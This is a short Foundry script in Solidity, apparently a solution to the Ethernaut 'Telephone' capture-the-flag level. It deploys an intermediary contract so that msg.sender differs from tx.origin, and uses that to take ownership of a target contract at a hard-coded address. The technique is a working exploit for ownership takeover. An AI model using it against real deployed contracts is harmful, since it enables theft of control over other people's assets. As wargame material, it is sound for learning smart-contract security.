// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Telephone.sol";

contract Cellphone {
    function call(address telephone, address _owner) external {
        Telephone telephone = Telephone(telephone);
        telephone.changeOwner(_owner);
        console.log(telephone.owner());
    }
}

contract TelephoneSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // console.log(vm.envAddress("MY_ADDRESS"));
        Cellphone cellphone = new Cellphone();
        cellphone.call(
            0x0f7b748Ae627C7B1B989012e303Bc0C172AeEE13,
            vm.envAddress("MY_ADDRESS")
        );
        // console.log(tx.origin, msg.sender);

        vm.stopBroadcast();
    }
}
